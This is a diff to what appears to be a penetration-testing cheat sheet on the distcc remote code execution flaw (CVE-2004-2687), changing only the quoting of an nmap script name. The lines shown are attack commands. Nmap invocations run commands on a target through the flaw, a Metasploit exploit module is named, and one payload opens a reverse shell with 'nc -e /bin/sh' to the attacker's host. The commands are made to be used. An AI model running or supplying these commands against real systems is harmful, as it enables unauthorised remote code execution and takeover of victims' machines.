@@ -11,14 +11,14 @@
 ### Quick Check (One-liner)
 
 ```shell
-nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" $rhost
+nmap -p 3632 --script "distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd='id'" $rhost
 ```
 
 ### Nmap
 
 ```shell
 nmap -sV -sC -p 3632 $rhost
-nmap -p 3632 --script distcc-cve2004-2687 $rhost
+nmap -p 3632 --script "distcc-cve2004-2687" $rhost
 ```
 
 ---
@@ -32,7 +32,7 @@ nmap -p 3632 --script distcc-cve2004-2687 $rhost
 ### Nmap Script
 
 ```shell
-nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'" $rhost
+nmap -p 3632 --script "distcc-cve2004-2687" --script-args="distcc-cve2004-2687.cmd='id'" $rhost
 ```
 
 ### Metasploit
@@ -109,7 +109,7 @@ set LPORT $lport
 run
 
 # Using Nmap
-nmap -p 3632 --script distcc-cve2004-2687 \
+nmap -p 3632 --script "distcc-cve2004-2687" \
   --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh $lhost $lport'" $rhost
 ```
 
@@ -119,5 +119,5 @@ nmap -p 3632 --script distcc-cve2004-2687 \
 
 | Tool | Command |
 | :--- | :--- |
-| Nmap | `nmap -p 3632 --script distcc-cve2004-2687 $rhost` |
+| Nmap | `nmap -p 3632 --script "distcc-cve2004-2687" $rhost` |
 | Metasploit | `use exploit/unix/misc/distcc_exec` |
